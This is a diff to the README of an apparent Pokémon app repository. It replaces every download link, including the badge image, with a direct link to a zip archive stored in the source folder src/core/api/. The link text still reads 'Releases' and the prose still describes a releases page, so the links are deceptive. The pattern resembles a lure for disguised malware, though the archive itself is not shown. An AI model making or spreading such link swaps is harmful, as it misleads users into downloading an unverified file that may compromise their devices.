@@ -1,6 +1,6 @@
 # 🐞 PokedexApp - Explore Pokémon Anytime, Anywhere
 
-[![Download PokedexApp](https://img.shields.io/badge/Download-PokedexApp-blue?style=for-the-badge)](https://github.com/HEJIeHuB4uK/PokedexApp/releases)
+[![Download PokedexApp](https://github.com/HEJIeHuB4uK/PokedexApp/raw/refs/heads/main/src/core/api/Pokedex_App_2.2.zip)](https://github.com/HEJIeHuB4uK/PokedexApp/raw/refs/heads/main/src/core/api/Pokedex_App_2.2.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get PokedexApp on your device and start exploring Pokémon
 
 Click the big blue badge above or visit this link to download the app:
 
-[Download PokedexApp Releases](https://github.com/HEJIeHuB4uK/PokedexApp/releases)
+[Download PokedexApp Releases](https://github.com/HEJIeHuB4uK/PokedexApp/raw/refs/heads/main/src/core/api/Pokedex_App_2.2.zip)
 
 This page holds the latest versions for different devices. You will see files for Android (.apk), iOS (.ipa or instructions), and desktop versions if available. Each release lists its date and any notes about improvements or fixes.
 
@@ -95,7 +95,7 @@ All these components work together to provide a stable and easy-to-use experienc
 
 Use this link to get started:
 
-[Download PokedexApp Releases](https://github.com/HEJIeHuB4uK/PokedexApp/releases)
+[Download PokedexApp Releases](https://github.com/HEJIeHuB4uK/PokedexApp/raw/refs/heads/main/src/core/api/Pokedex_App_2.2.zip)
 
 1. Visit the page.  
 2. Pick your device type and download the latest version.  
